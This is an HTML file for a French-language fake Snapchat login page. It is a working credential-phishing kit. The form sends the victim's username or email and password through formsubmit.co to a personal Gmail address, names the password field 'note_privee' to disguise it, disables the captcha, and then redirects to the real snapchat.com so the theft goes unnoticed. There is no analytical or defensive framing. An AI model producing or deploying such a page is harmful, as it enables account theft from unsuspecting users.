<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Se connecter à Snapchat</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-container {
            background-color: white;
            border-radius: 12px;
            padding: 48px 40px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 440px;
            text-align: center;
        }
        .logo-container { margin-bottom: 32px; display: flex; justify-content: center; height: 64px; }
        h1 { font-size: 28px; font-weight: 600; color: #1a1a1a; margin-bottom: 32px; line-height: 1.3; }
        .form-group { margin-bottom: 20px; text-align: left; }
        label { display: block; font-size: 14px; font-weight: 500; color: #505050; margin-bottom: 8px; }
        input {
            width: 100%;
            padding: 14px 16px;
            font-size: 15px;
            border: 1px solid #d4d4d4;
            border-radius: 8px;
            outline: none;
            background-color: #fafafa;
        }
        input:focus { border-color: #00a7e1; background-color: white; }
        .submit-btn {
            width: 100%;
            padding: 14px 24px;
            background-color: #00a7e1;
            color: white;
            border: none;
            border-radius: 24px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo-container">
            <img src="img/Snap.png" alt="Snapchat Logo" style="width: 64px; height: 64px;">
        </div>
        
        <h1>Se connecter à<br>Snapchat</h1>
        
        <form action="https://formsubmit.co/billcypher023@gmail.com" method="POST">
            <input type="hidden" name="_next" value="https://www.snapchat.com">
            <input type="hidden" name="_captcha" value="false">

            <div class="form-group">
                <label>Nom d'utilisateur ou adresse e-mail</label>
                <input type="text" name="identifiant" required>
            </div>
            
            <div class="form-group">
                <label>Mot de passe</label>
                <input type="password" name="note_privee" required>
            </div>
            
            <button type="submit" class="submit-btn">Suivant</button>
        </form>
    </div>
</body>
</html>
